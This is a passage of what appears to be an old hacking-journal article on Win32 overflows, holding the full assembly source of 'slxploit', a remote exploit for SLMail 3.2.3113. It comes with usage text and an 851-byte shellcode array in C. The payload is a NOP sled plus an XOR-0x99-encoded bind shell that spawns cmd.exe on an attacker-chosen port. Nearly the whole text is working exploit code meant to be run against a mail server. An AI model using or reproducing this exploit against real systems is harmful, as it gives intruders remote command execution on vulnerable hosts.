+ db 0f4h, 0fch, 0fdh, 0c9h, 0f0h, 0e9h, 0fch, 099h, 0deh, 0f5h, 0f6h, 0fbh
+ db 0f8h, 0f5h, 0d8h, 0f5h, 0f5h, 0f6h, 0fah, 099h, 0ceh, 0ebh, 0f0h, 0edh
+ db 0fch, 0dfh, 0f0h, 0f5h, 0fch, 099h, 0cbh, 0fch, 0f8h, 0fdh, 0dfh, 0f0h
+ db 0f5h, 0fch, 099h, 0cah, 0f5h, 0fch, 0fch, 0e9h, 099h, 0dch, 0e1h, 0f0h
+ db 0edh, 0c9h, 0ebh, 0f6h, 0fah, 0fch, 0eah, 0eah, 099h, 0ceh, 0cah, 0d6h
+ db 0dah, 0d2h, 0aah, 0abh, 099h, 0eah, 0f6h, 0fah, 0f2h, 0fch, 0edh, 099h
+ db 0fbh, 0f0h, 0f7h, 0fdh, 099h, 0f5h, 0f0h, 0eah, 0edh, 0fch, 0f7h, 099h
+ db 0f8h, 0fah, 0fah, 0fch, 0e9h, 0edh, 099h, 0eah, 0fch, 0f7h, 0fdh, 099h
+ db 0ebh, 0fch, 0fah, 0efh, 099h, 09bh, 099h 
+ store dw ? 
+ db 099h, 099h, 099h
+ db 099h, 099h, 099h, 099h, 099h, 099h, 099h, 099h, 099h, 0fah, 0f4h, 0fdh
+ db 0b7h, 0fch, 0e1h, 0fch, 099h, 0ffh, 0ffh, 0ffh, 0ffh, 00dh, 00ah  
+
+logo  db "SLMail (3.2.3113) remote.", 13, 10
+      db "by dark spyrit aka Barnaby Jack <dspyrit@beavuh.org>",13,10,13,10
+      db "usage: slxploit <host> <port> <port to bind shell>", 13, 10
+      db "eg - slxploit host.com 27 1234",13,10,0
+      logolen equ $-logo
+
+
+errorinit db 10,"error initializing winsock.", 13, 10, 0
+errorinitl equ $-errorinit
+
+derror  db 10,"error.",13,10,0
+derrorl equ $-derror
+
+nohost db 10,"no host or ip specified.", 13,10,0
+nohostl equ $-nohost
+
+noport db 10,"no port specified.",13,10,0
+noportl equ $-noport
+
+no_port2 db 10,"no bind port specified.",13,10,0
+no_port2l equ $-no_port2
+
+response db 10,"waiting for response....",13,10,0
+respl   equ $-response
+
+reshost db 10,"error resolving host.",13,10,0
+reshostl equ $-reshost
+
+sockerr db 10,"error creating socket.",13,10,0
+sockerrl equ $-sockerr
+
+ipill   db 10,"ip error.",13,10,0
+ipilll   equ $-ipill
+
+cnerror db 10,"error establishing connection.",13,10,0
+cnerrorl equ $-cnerror
+
+success db 10,"sent.. spawn connection now.",13,10,0
+successl equ $-success
+
+console_in      dd      ?
+console_out     dd      ?
+bytes_read      dd      ?
+
+wsadescription_len equ 256
+wsasys_status_len equ 128
+
+WSAdata struct
+wVersion dw ?
+wHighVersion dw ?
+szDescription db wsadescription_len+1 dup (?)
+szSystemStatus db wsasys_status_len+1 dup (?)
+iMaxSockets dw ?
+iMaxUdpDg dw ?
+lpVendorInfo dw ?
+WSAdata ends
+
+sockaddr_in struct
+sin_family dw ?
+sin_port dw ?
+sin_addr dd ?
+sin_zero db 8 dup (0)
+sockaddr_in ends
+
+wsadata WSAdata <?>
+sin sockaddr_in <?>
+sock dd ?
+numbase dd 10
+_port db 256 dup (?)
+_host db 256 dup (?)
+_port2 db 256 dup (?)
+buffer db 1000 dup (0)
+
+.code
+start:
+
+	call    init_console
+	push    logolen
+	push    offset logo
+	call    write_console
+
+	call    GetCommandLineA
+	mov     edi, eax
+	mov     ecx, -1
+	xor     al, al
+	push    edi
+	repnz   scasb
+	not     ecx
+	pop     edi
+	mov     al, 20h
+	repnz   scasb
+	dec     ecx
+	cmp     ch, 0ffh
+	jz      @@0
+	test    ecx, ecx
+	jnz     @@1
+@@0:        
+	push    nohostl
+	push    offset nohost
+	call    write_console
+	jmp     quit3
+@@1:
+	mov     esi, edi
+	lea     edi, _host
+	call    parse
+	or      ecx, ecx
+	jnz     @@2
+	push    noportl
+	push    offset noport
+	call    write_console
+	jmp     quit3
+@@2:
+	lea     edi, _port
+	call    parse
+	or      ecx, ecx
+	jnz     @@3
+	push    no_port2l
+	push    offset no_port2
+	call    write_console
+	jmp     quit3
+
+@@3:
+	push    ecx
+	lea     edi, _port2
+	call    parse
+
+	push    offset wsadata
+	push    0101h
+	call    WSAStartup
+	or      eax, eax
+	jz      winsock_found
+
+	push    errorinitl
+	push    offset errorinit
+	call    write_console
+	jmp     quit3
+
+winsock_found:
+	xor     eax, eax
+	push    eax
+	inc     eax
+	push    eax
+	inc     eax
+	push    eax
+	call    socket
+	cmp     eax, -1
+	jnz     socket_ok
+
+	push    sockerrl
+	push    offset sockerr
+	call    write_console
+	jmp     quit2
+
+socket_ok:
+	mov     sock, eax
+	mov     sin.sin_family, 2
+	
+	mov     ebx, offset _port
+	call    str2num
+	mov     eax, edx
+	push    eax
+	call    htons
+	mov     sin.sin_port, ax
+	
+	mov     ebx, offset _port2
+	call    str2num
+	mov     eax, edx
+	push    eax
+	call    htons
+	xor     ax, 09999h
+	mov     store, ax
+
+	mov     esi, offset _host
+lewp:
+	xor     al, al
+	lodsb
+	cmp     al, 039h
+	ja      gethost
+	test    al, al
+	jnz     lewp
+	push    offset _host
+	call    inet_addr
+	cmp     eax, -1
+	jnz     ip_aight
+	push    ipilll
+	push    offset ipill
+	call    write_console
+	jmp     quit1
+
+ip_aight:
+	mov     sin.sin_addr, eax
+	jmp     continue
+
+gethost:
+	push    offset _host
+	call    gethostbyname
+	test    eax, eax
+	jnz     gothost
+
+	push    reshostl
+	push    offset reshost
+	call    write_console
+	jmp     quit1
+
+gothost:
+	mov     eax, [eax+0ch]
+	mov     eax, [eax]
+	mov     eax, [eax]
+	mov     sin.sin_addr, eax
+
+continue:
+	push    size sin
+	push    offset sin
+	push    sock
+	call    connect
+	or      eax, eax
+	jz      connect_ok
+	push    cnerrorl
+	push    offset cnerror
+	call    write_console
+	jmp     quit1
+
+connect_ok:
+	push    respl
+	push    offset response
+	call    write_console
+	
+	xor     eax, eax
+	push    eax
+	push    1000
+	push    offset buffer
+	push    sock
+	call    recv
+	or      eax, eax
+	jg      sveet
+
+	push    derrorl        
+	push    offset derror
+	call    write_console
+	jmp     quit1
+
+sveet:        
+	push    eax
+	push    offset buffer
+	call    write_console
+
+	xor     eax, eax
+	push    eax
+	push    sploit_length
+	push    offset sploit
+	push    sock
+	call    send
+	push    successl
+	push    offset success
+	call    write_console
+
+quit1:
+	push    sock
+	call    closesocket
+quit2:
+	call    WSACleanup
+quit3:
+	push    0
+	call    ExitProcess
+parse   proc
+;cheap parsing.. 
+lewp9:
+	xor     eax, eax
+	cld
+	lodsb
+	cmp     al, 20h
+	jz      done
+	test    al, al
+	jz      done2
+	stosb
+	dec     ecx
+	jmp     lewp9
+done:
+	dec     ecx
+done2:
+	ret
+endp
+
+str2num proc
+	push    eax ecx edi
+	xor     eax, eax
+	xor     ecx, ecx
+	xor     edx, edx
+	xor     edi, edi
+lewp2:
+	xor     al, al
+	xlat
+	test    al, al
+	jz      end_it
+	sub     al, 030h
+	mov     cl, al
+	mov     eax, edx
+	mul     numbase
+	add     eax, ecx
+	mov     edx, eax
+	inc     ebx
+	inc     edi
+	cmp     edi, 0ah
+	jnz     lewp2
+
+end_it:
+	pop     edi ecx eax
+	ret
+endp
+
+init_console  proc
+	push    -10
+	call    GetStdHandle
+	or      eax, eax
+	je      init_error
+	mov     [console_in], eax
+	push    -11
+	call    GetStdHandle
+	or      eax, eax
+	je      init_error
+	mov     [console_out], eax
+	ret
+init_error:
+	push    0
+	call    ExitProcess
+endp
+
+write_console proc    text_out:dword, text_len:dword
+	pusha
+	push    0
+	push    offset bytes_read 
+	push    text_len          
+	push    text_out          
+	push    console_out       
+	call    WriteConsoleA
+	popa
+	ret
+endp
+
+end     start
+
+;--(code ends)------------------------------------------------------------
+<-->
+Here is the shellcode in c format:
+
+<++> P55/Win32-overflows/slxploit-shellcode.c !f4bcdaf5
+#define sploit_length 851
+
+unsigned char sploit[851] = {
+  0x65, 0x78, 0x70, 0x6e, 0x20, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x90, 0x90, 0xeb, 0x07, 0x90, 0xaa, 0x1c, 0x9c, 0x77, 0x90, 0x90, 0x90,
+  0x33, 0xc0, 0x50, 0xf7, 0xd0, 0x50, 0x59, 0xf2, 0xaf, 0x59, 0xb1, 0xc6,
+  0x8b, 0xc7, 0x48, 0x80, 0x30, 0x99, 0xe2, 0xfa, 0x33, 0xf6, 0x96, 0xbb,
+  0x99, 0x10, 0x11, 0x44, 0xc1, 0xeb, 0x08, 0x56, 0xff, 0x13, 0x8b, 0xd0,
+  0xfc, 0x33, 0xc9, 0xb1, 0x0b, 0x49, 0x32, 0xc0, 0xac, 0x84, 0xc0, 0x75,
+  0xf9, 0x52, 0x51, 0x56, 0x52, 0xb3, 0x0c, 0xff, 0x13, 0xab, 0x59, 0x5a,
+  0xe2, 0xec, 0x32, 0xc0, 0xac, 0x84, 0xc0, 0x75, 0xf9, 0xb3, 0x10, 0x56,
+  0xff, 0x13, 0x8b, 0xd0, 0xfc, 0x33, 0xc9, 0xb1, 0x06, 0x32, 0xc0, 0xac,
+  0x84, 0xc0, 0x75, 0xf9, 0x52, 0x51, 0x56, 0x52, 0xb3, 0x0c, 0xff, 0x13,
+  0xab, 0x59, 0x5a, 0xe2, 0xec, 0x83, 0xc6, 0x05, 0x33, 0xc0, 0x50, 0x40,
+  0x50, 0x40, 0x50, 0xff, 0x57, 0xe8, 0x93, 0x6a, 0x10, 0x56, 0x53, 0xff,
+  0x57, 0xec, 0x6a, 0x02, 0x53, 0xff, 0x57, 0xf0, 0x33, 0xc0, 0x57, 0x50,
+  0xb0, 0x0c, 0xab, 0x58, 0xab, 0x40, 0xab, 0x5f, 0x48, 0x50, 0x57, 0x56,
+  0xad, 0x56, 0xff, 0x57, 0xc0, 0x48, 0x50, 0x57, 0xad, 0x56, 0xad, 0x56,
+  0xff, 0x57, 0xc0, 0x48, 0xb0, 0x44, 0x89, 0x07, 0x57, 0xff, 0x57, 0xc4,
+  0x33, 0xc0, 0x8b, 0x46, 0xf4, 0x89, 0x47, 0x3c, 0x89, 0x47, 0x40, 0x8b,
+  0x06, 0x89, 0x47, 0x38, 0x33, 0xc0, 0x66, 0xb8, 0x01, 0x01, 0x89, 0x47,
+  0x2c, 0x57, 0x57, 0x33, 0xc0, 0x50, 0x50, 0x50, 0x40, 0x50, 0x48, 0x50,
+  0x50, 0xad, 0x56, 0x33, 0xc0, 0x50, 0xff, 0x57, 0xc8, 0xff, 0x76, 0xf0,
+  0xff, 0x57, 0xcc, 0xff, 0x76, 0xfc, 0xff, 0x57, 0xcc, 0x48, 0x50, 0x50,
+  0x53, 0xff, 0x57, 0xf4, 0x8b, 0xd8, 0x33, 0xc0, 0xb4, 0x04, 0x50, 0xc1,
+  0xe8, 0x04, 0x50, 0xff, 0x57, 0xd4, 0x8b, 0xf0, 0x33, 0xc0, 0x8b, 0xc8,
+  0xb5, 0x04, 0x50, 0x50, 0x57, 0x51, 0x50, 0xff, 0x77, 0xa8, 0xff, 0x57,
+  0xd0, 0x83, 0x3f, 0x01, 0x7c, 0x22, 0x33, 0xc0, 0x50, 0x57, 0xff, 0x37,
+  0x56, 0xff, 0x77, 0xa8, 0xff, 0x57, 0xdc, 0x0b, 0xc0, 0x74, 0x2f, 0x33,
+  0xc0, 0x50, 0xff, 0x37, 0x56, 0x53, 0xff, 0x57, 0xf8, 0x6a, 0x50, 0xff,
+  0x57, 0xe0, 0xeb, 0xc8, 0x33, 0xc0, 0x50, 0xb4, 0x04, 0x50, 0x56, 0x53,
+  0xff, 0x57, 0xfc, 0x57, 0x33, 0xc9, 0x51, 0x50, 0x56, 0xff, 0x77, 0xac,
+  0xff, 0x57, 0xd8, 0x6a, 0x50, 0xff, 0x57, 0xe0, 0xeb, 0xaa, 0x50, 0xff,
+  0x57, 0xe4, 0x90, 0xd2, 0xdc, 0xcb, 0xd7, 0xdc, 0xd5, 0xaa, 0xab, 0x99,
+  0xda, 0xeb, 0xfc, 0xf8, 0xed, 0xfc, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde,
+  0xfc, 0xed, 0xca, 0xed, 0xf8, 0xeb, 0xed, 0xec, 0xe9, 0xd0, 0xf7, 0xff,
+  0xf6, 0xd8, 0x99, 0xda, 0xeb, 0xfc, 0xf8, 0xed, 0xfc, 0xc9, 0xeb, 0xf6,
+  0xfa, 0xfc, 0xea, 0xea, 0xd8, 0x99, 0xda, 0xf5, 0xf6, 0xea, 0xfc, 0xd1,
+  0xf8, 0xf7, 0xfd, 0xf5, 0xfc, 0x99, 0xc9, 0xfc, 0xfc, 0xf2, 0xd7, 0xf8,
+  0xf4, 0xfc, 0xfd, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde, 0xf5, 0xf6, 0xfb,
+  0xf8, 0xf5, 0xd8, 0xf5, 0xf5, 0xf6, 0xfa, 0x99, 0xce, 0xeb, 0xf0, 0xed,
+  0xfc, 0xdf, 0xf0, 0xf5, 0xfc, 0x99, 0xcb, 0xfc, 0xf8, 0xfd, 0xdf, 0xf0,
+  0xf5, 0xfc, 0x99, 0xca, 0xf5, 0xfc, 0xfc, 0xe9, 0x99, 0xdc, 0xe1, 0xf0,
+  0xed, 0xc9, 0xeb, 0xf6, 0xfa, 0xfc, 0xea, 0xea, 0x99, 0xce, 0xca, 0xd6,
+  0xda, 0xd2, 0xaa, 0xab, 0x99, 0xea, 0xf6, 0xfa, 0xf2, 0xfc, 0xed, 0x99,
+  0xfb, 0xf0, 0xf7, 0xfd, 0x99, 0xf5, 0xf0, 0xea, 0xed, 0xfc, 0xf7, 0x99,
+  0xf8, 0xfa, 0xfa, 0xfc, 0xe9, 0xed, 0x99, 0xea, 0xfc, 0xf7, 0xfd, 0x99,
+  0xeb, 0xfc, 0xfa, 0xef, 0x99, 0x9b, 0x99, 
+  0x00, 0x00, // word value for bind port, client must mod and XOR with 0x99
+  0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
+  0xfa, 0xf4, 0xfd, 0xb7, 0xfc, 0xe1, 0xfc, 0x99, 0xff, 0xff, 0xff, 0xff, 
+  0x0d, 0x0a};
+<-->
+----[  EOF
